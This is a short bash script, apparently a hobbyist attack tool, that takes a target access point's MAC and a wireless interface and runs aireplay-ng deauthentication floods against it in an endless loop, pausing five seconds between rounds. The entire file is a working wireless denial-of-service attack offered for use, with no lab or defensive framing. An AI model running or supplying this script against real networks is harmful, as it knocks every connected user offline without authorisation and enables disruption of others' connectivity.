figlet 'Deauth All'
echo 'Author: Jethr0'
if [ -z "$1" ]
then
    echo '[!] Missing arguments!'
    echo 'Usage:'
    echo 'bash deauth-all.sh <targets MAC> <wireless interface>'
else
    NUMBER=1
    while (( NUMBER == 1 ))
    do
        aireplay-ng -0 0 -a $1 $2
        echo '[!] Network was reset. Waiting 5 seconds and recommencing attack'
        sleep 5
    done
fi
